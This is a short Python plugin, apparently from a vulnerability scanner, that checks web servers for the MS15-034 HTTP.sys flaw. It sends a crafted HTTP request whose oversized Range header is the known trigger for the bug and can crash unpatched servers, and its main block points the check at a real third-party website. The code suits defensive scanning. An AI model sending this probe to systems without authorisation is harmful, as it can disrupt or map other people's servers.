#!/usr/bin/env python3

import socket
from urllib.parse import urlparse

class MS15_034_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'MS15-034漏洞',
            'description': 'MS15-034 HTTP.sys远程代码执行漏洞,影响范围为: Windows 7, Windows 8, Windows 8.1, Windows 2008 R2, Windows 2012, Windows 2012 R2',
            'date': '2015-04-22',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        self.timeout = 3
        url_parse = urlparse(self.url)
        self.host = url_parse.hostname
        self.port = url_parse.port
        if not self.port:
            self.port = '80'

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            socket.setdefaulttimeout(self.timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, int(self.port)))
            flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n".encode('utf-8')
            s.send(flag)
            data = s.recv(1024)
            if 'Requested Range Not Satisfiable' in data.decode('utf-8') and 'Server: Microsoft' in data.decode('utf-8'):
                return True
        except Exception as e:
            # print(e)
            pass
        finally:
            try:
                s.close()
            except:
                pass

if  __name__ == "__main__":
    MS15_034 = MS15_034_BaseVerify('http://baidu.com')
    MS15_034.check()